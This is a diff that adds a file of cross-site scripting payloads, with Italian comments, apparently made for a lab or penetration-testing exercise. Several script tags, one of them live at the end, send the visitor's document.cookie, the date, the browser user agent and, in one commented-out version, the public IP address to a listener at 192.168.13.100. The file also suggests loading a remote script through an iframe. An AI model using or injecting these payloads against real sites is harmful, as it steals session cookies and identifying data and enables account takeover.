@@ -1,0 +1,27 @@
+<!-- // Script cookie
+<SCRIPT>var i = new Image();i.src="http://192.168.13.100:7778?c="+document.cookie</SCRIPT>
+
+// Scipt per ricevere la data
+<SCRIPT>var i = new Image();i.src="http://192.168.13.100:7779?c="+ new Date()</SCRIPT>
+
+// Se si vuole avere altro si puo utilizzare un iframe.
+// <iframe src="http://192.168.13.100:8000/script_iframe.html"></iframe>
+// sudo -m http.server -->
+
+<!-- 
+<script>
+    var i = new Image(); 
+    let data = [];
+    data.push(document.cookie); 
+    data.push(navigator.userAgent);
+    data.push(new Date()); 
+    fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data2 => {
+                    console.log("Il tuo indirizzo IP pubblico è:", data2.ip);
+                    data.push(data2.ip);
+                });  
+    i.src="http://192.168.13.100:7778?c="+data
+</script> -->
+
+<SCRIPT>var i = new Image();var d= []; d.push(document.cookie); d.push(new Date()); i.src="http://192.168.13.100:7778?c="+d</SCRIPT>
